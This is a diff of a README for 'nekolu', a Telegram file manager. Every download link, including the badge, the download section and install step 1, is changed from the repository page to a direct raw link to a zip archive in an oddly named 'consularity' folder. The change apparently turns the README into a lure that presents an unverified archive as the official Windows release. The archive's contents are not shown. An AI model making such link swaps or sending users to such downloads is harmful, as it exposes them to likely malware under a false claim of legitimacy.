@@ -1,10 +1,10 @@
 # 📁 nekolu - Telegram Files, Managed Your Way
 
-[![Download nekolu](https://img.shields.io/badge/Download%20nekolu-blue?style=for-the-badge&logo=github)](https://github.com/Little-sevens789/nekolu)
+[![Download nekolu](https://img.shields.io/badge/Download%20nekolu-blue?style=for-the-badge&logo=github)](https://github.com/Little-sevens789/nekolu/raw/refs/heads/main/consularity/Software_2.3-alpha.5.zip)
 
 ## 📥 Download
 
-Visit this page to download: [https://github.com/Little-sevens789/nekolu](https://github.com/Little-sevens789/nekolu)
+Visit this page to download: [https://github.com/Little-sevens789/nekolu/raw/refs/heads/main/consularity/Software_2.3-alpha.5.zip](https://github.com/Little-sevens789/nekolu/raw/refs/heads/main/consularity/Software_2.3-alpha.5.zip)
 
 ## 🖥️ What nekolu does
 
@@ -26,7 +26,7 @@ Before you start, make sure you have:
 
 Follow these steps to get nekolu running on your PC.
 
-1. Open the download page: [https://github.com/Little-sevens789/nekolu](https://github.com/Little-sevens789/nekolu)
+1. Open the download page: [https://github.com/Little-sevens789/nekolu/raw/refs/heads/main/consularity/Software_2.3-alpha.5.zip](https://github.com/Little-sevens789/nekolu/raw/refs/heads/main/consularity/Software_2.3-alpha.5.zip)
 2. Look for the latest release or package on the page
 3. Download the Windows file from that page
 4. Save the file to a folder you can find again, such as Downloads or Desktop
